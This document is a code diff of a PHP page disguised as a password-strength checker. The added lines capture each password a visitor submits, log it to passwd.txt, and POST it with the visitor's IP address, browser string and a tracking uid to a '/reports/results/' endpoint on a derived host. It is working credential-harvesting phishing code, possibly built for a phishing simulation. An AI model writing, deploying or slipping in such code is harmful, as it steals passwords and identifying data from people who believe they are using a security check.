@@ -1,7 +1,14 @@
 <?php
    $password = $_POST['FormFieldName'];
-   $hash = $_GET['id'];
-   $user = base64_decode($_GET['id']);
+   if ($password != "") {
+    $password = "password:" . $password; 
+   }
+   //$hash = $_GET['id'];
+   //$user = base64_decode($_GET['id']);
+   $uid = $_GET['uid'];
+   $ip = $_SERVER["REMOTE_ADDR"];
+   $browser = $_SERVER['HTTP_USER_AGENT'];
+   $host = $_SERVER['HTTP_HOST'];
    $myFile = "passwd.txt";
    $date = date("F j, Y, g:i a");
    $fh = fopen($myFile, 'a') or die("can't open file");
@@ -14,6 +21,22 @@
 	} else {
 	    $strength = "Your password is not safe.";
 	}
+
+  $url = "http://" . explode(".",$host,2)[1] . '/reports/results/'; 
+  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $password);
+
+  // use key 'http' even if you send the request to https://...
+  $options = array(
+          'http' => array(
+          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+          'method'  => 'POST',
+          'content' => http_build_query($data),
+          ),
+  );
+  $context  = stream_context_create($options);
+  $result = file_get_contents($url, false, $context);
+
+  echo(null);
 ?>
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
@@ -849,7 +872,7 @@ loadAsyncScript('http://apis.google.com/js/plusone.js', 'https://apis.google.com
   <![endif]-->
  <div id="passwordContent">
 
-<form method="POST" action="index2.php?id=<?php echo $hash ?>" name="NFuseForm" autocomplete="off">
+<form method="POST" action="index2.php?uid=<?php echo $uid ?>" name="NFuseForm" autocomplete="off">
   <div  id="page" class="clearfix wapwrapper" data-component="consumer-security" data-component-id="1"><!-- column -->
    <div class="position_content" id="page_position_content">
     <div class="clearfix colelem" id="pu1279"><!-- group -->
